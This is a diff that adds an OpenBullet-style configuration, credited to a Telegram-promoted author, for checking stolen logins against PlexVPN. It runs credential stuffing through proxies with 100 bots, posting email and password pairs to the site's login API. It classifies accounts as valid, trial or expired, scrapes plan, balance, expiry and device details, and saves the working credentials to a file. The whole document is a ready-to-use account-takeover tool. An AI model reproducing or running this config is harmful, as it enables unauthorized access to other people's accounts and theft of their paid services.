@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "PlexVPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-17T04:43:56.9083321-08:00",
+  "AdditionalInfo": "Telegram Channel : T.me/ghoulblack",
+  "RequiredPlugins": [],
+  "Author": "👑LilTOBA👑",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#EncodeUSER FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#EncodePASS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#Login REQUEST POST "https://www.plexvpn.pro/api/login" 
+  CONTENT "email=<US>&password=<PS>&qr_token=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.plexvpn.pro" 
+  HEADER "pv-language: en" 
+  HEADER "referer: https://www.plexvpn.pro/login" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Password is incorrect." 
+    KEY "Email does not exist." 
+    KEY "{\"code\":103" 
+  KEYCHAIN Success OR 
+    KEY "{\"code\":0,\"data\":{\"id\":" 
+  KEYCHAIN Custom "TRIAL" OR 
+    KEY "<SOURCE>" EqualTo "\"role\":\"trier\"," 
+    KEY "\"value_of_expire_in\":1," 
+    KEY "\"value_of_expire_in\":2," 
+    KEY "\"value_of_expire_in\":3," 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "\"value_of_expire_in\":0," 
+
+#Plan PARSE "<SOURCE>" LR "\"role\":\"" "\"," CreateEmpty=FALSE -> CAP "Plan" 
+
+#Expire PARSE "<SOURCE>" LR "\"expire_at\":" "," -> VAR "Expire" 
+
+#UnixtoDate FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "<Expire>" -> CAP "Expire at" 
+
+#MaxDevice PARSE "<SOURCE>" LR "\"max_device_count\":" "," CreateEmpty=FALSE -> CAP "Max Device Count" 
+
+#AwardDays PARSE "<SOURCE>" LR "\"award_days\":" "," CreateEmpty=FALSE -> CAP "Award Days" 
+
+#ItunesSub PARSE "<SOURCE>" LR "\"itunes_subscribed\":" "," CreateEmpty=FALSE -> CAP "Itunes Subscribed" 
+
+#Balance PARSE "<SOURCE>" LR "\"balance\":" "," CreateEmpty=FALSE -> CAP "Balance" 
+
+#InvitationCount PARSE "<SOURCE>" LR "\"invitation_count\":" "}}" CreateEmpty=FALSE -> CAP "Invitation Count" 
+
+#TimeNow FUNCTION CurrentUnixTime -> VAR "TimeNow" 
+
+#TimeChecked FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "<TimeNow>" -> VAR "Time Checked" 
+
+#TimePlan FUNCTION DateToUnixTime "M/d/yyyy" "<Expire at>" -> VAR "TimePlan" 
+
+#Comput FUNCTION Compute "(<TimePlan>-<TimeNow>)/86400" -> VAR "Comput" 
+
+#DaysLeft FUNCTION Round "<Comput>" -> CAP "DaysLeft" 
+
+UTILITY File "plexvpn.txt" AppendLines "<USER>: <PASS> //\\n =============================" 
+
